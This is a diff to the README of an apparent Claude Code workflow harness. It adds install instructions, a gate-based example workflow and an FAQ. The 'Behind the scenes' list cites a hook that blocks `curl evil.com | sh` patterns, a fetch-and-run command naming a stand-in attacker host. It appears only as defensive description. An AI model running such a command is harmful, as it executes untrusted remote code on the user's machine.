@@ -4,9 +4,35 @@
 
 [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Version](https://img.shields.io/github/v/tag/uzysjung/uzys-claude-harness?label=version)](https://github.com/uzysjung/uzys-claude-harness/releases)
-[![Tests](https://img.shields.io/badge/tests-111%20PASS%20%2F%200%20FAIL-brightgreen)](test-harness.sh)
+[![Tests](https://img.shields.io/badge/tests-111%20PASS%20%2F%200%20FAIL-brightgreen)](scripts/test-harness.sh)
+[![CI](https://github.com/uzysjung/uzys-claude-harness/actions/workflows/test.yml/badge.svg)](https://github.com/uzysjung/uzys-claude-harness/actions)
 
 🇰🇷 **한국어 README**: [README.ko.md](./README.ko.md)
+
+## 30-second start
+
+```bash
+# in your project directory:
+curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
+  | bash -s -- --track csr-fastapi --project-dir .
+
+# then start Claude Code:
+claude
+> /uzys:spec    # define what you're building
+> /uzys:auto    # run the full pipeline (Plan → Build → Test → Review → Ship)
+```
+
+Replace `csr-fastapi` with one of: `csr-supabase`, `csr-fastify`, `ssr-nextjs`, `ssr-htmx`, `data`, `executive`, `tooling`, `full` — see [Tracks](#tracks-full-reference).
+
+## Why this?
+
+| Use it when… | Skip it when… |
+|--------------|---------------|
+| You want a **deterministic 6-gate workflow** (Spec → Ship) instead of free-form chat | You're doing a single-line fix and just need plain Claude Code |
+| You work across **multiple stacks** (Python REST + React, Next.js, data/PySide6, executive docs) and want one harness | You only ever touch one stack and one set of tools |
+| You want **ECC, agent-skills, Anthropic skills, Railway, Supabase** wired up per-track without manual setup | You prefer to install each plugin/MCP yourself with full control |
+| You want the LLM constrained by **hooks** (file protection, security scan, gate ordering) — not just prompts | You want minimal intervention between the model and the filesystem |
+| You value **lean** — every Rule/Hook earns its place; obvious linter-territory stuff is removed | You like comprehensive style guides and "best practices" enforced everywhere |
 
 ## What is this?
 
@@ -209,6 +235,46 @@ Common to all dev tracks: `addy-agent-skills`, `Impeccable`, `Playwright`, `find
 
 The 6-gate workflow is enforced by `gate-check.sh` (PreToolUse hook). Skipping a gate returns exit 2 with a blocker message. `/uzys:auto` runs the full pipeline as a Ralph loop until SPEC compliance is met (max 5 iterations).
 
+## Example workflow
+
+Building "an internal note-taking app with Postgres + Auth" on `csr-fastapi`:
+
+```bash
+# 1. Install harness on a fresh project
+mkdir notes && cd notes && git init
+curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
+  | bash -s -- --track csr-fastapi --project-dir .
+
+# 2. Open Claude Code
+claude
+
+# Inside Claude Code:
+> /uzys:spec
+# → Pre-SPEC questionnaire kicks in:
+#   - Prod DB engine?            "Postgres 16 (Railway)"
+#   - Test DB strategy?          "testcontainer (Postgres 16)"
+#   - External deps?             "GitHub OAuth (Live staging E2E required)"
+#   - Critical E2E flows?        "login → callback → /me, create note"
+#   - DESIGN.md/.impeccable.md?  "no — invoke /teach to set design tone first"
+# → docs/SPEC.md generated with Objective, AC, Non-Goals, DO NOT CHANGE
+
+> /uzys:auto
+# → Plan: trivial=skip, standard=milestones (3-5), complex=full task list
+#   (model-aware — Opus skips micro-decomposition, Haiku gets detailed)
+# → Build: per task, write failing test (RED) → implement (GREEN) → refactor
+# → Test: testcontainer Postgres + Live OAuth E2E (Mock not allowed)
+# → Review: 5-axis (correctness/readability/architecture/security/perf)
+#   via reviewer subagent (context: fork) — separate from implementor
+# → Ship: agentshield scan + SPEC drift check + Railway deploy
+# → Ralph loop iterates max 5 times if SPEC AC not met, then escalates
+```
+
+Behind the scenes:
+- `protect-files.sh` blocks Edits to `.env`, lock files, credentials
+- `gate-check.sh` blocks `/uzys:plan` if `define.completed=false`
+- `mcp-pre-exec.sh` enforces MCP allowlist + blocks `curl evil.com | sh` patterns
+- `agentshield-gate.sh` blocks `/uzys:ship` on CRITICAL findings
+
 ## 11 Behavioral Principles
 
 Distilled from Karpathy's LLM observations + Anthropic Harness Design + production agent operations:
@@ -285,6 +351,32 @@ This harness is built around three commitments (see `templates/CLAUDE.md`):
 1. **ECC.tools dependency** — minimal in-house code; orchestrate ECC skills/agents via `/uzys:*`
 2. **Ralph loop autonomy** — SPEC-based autonomous cycle via continuous-learning-v2 + `/uzys:auto`
 3. **Lean by design** — feature additions only after "is this in ECC already?" check; quarterly P10 audit
+
+## FAQ
+
+**Q. Does this work on Linux / WSL / Windows?**
+A. macOS + Linux (incl. WSL) are tested in CI. Native Windows shell is not supported — use WSL.
+
+**Q. Will it touch my global `~/.claude/`?**
+A. No. `setup-harness.sh --project-dir` blocks `~/.claude/*`, `/etc/*`, `/usr/bin/*` etc. (D16 protection). All installation is project-scoped.
+
+**Q. What if I already installed an older version?**
+A. `bash scripts/setup-harness.sh --update --project-dir .` — backs up `.claude/` to `.claude.backup-<ts>/`, overwrites only existing files with latest templates, prunes orphans (e.g., deprecated rule files), cleans stale hook references in `settings.json`.
+
+**Q. Why 9 Tracks? Isn't that over-engineered?**
+A. Tracks are conditional install lists, not abstractions. Adding a Track = one TSV row + one rule mapping. No runtime cost. Use only the Tracks you need; `--track` selection is explicit.
+
+**Q. Can I use this without ECC plugin?**
+A. Yes. ECC is opt-in (interactive prompt or `--with-ecc` flag). The 6-gate workflow + agent-skills + per-track plugins work standalone.
+
+**Q. How do I add a new Track / Rule / Hook?**
+A. See [CONTRIBUTING.md](./CONTRIBUTING.md) — step-by-step guide for each.
+
+**Q. Can I use this with Cursor / Codex instead of Claude Code?**
+A. Not yet. Hooks and `settings.json` syntax are Claude Code specific. Most agent-skills (npx skills) work cross-host (Agent Skills standard), but the harness orchestration is Claude-specific.
+
+**Q. The harness feels opinionated. Can I override?**
+A. Yes. After `--update` the harness regenerates files; before, you can edit any `.claude/rules/*.md` or `templates/*` and they stick. `setup-harness.sh` only overwrites on `--update`.
 
 ## License
 
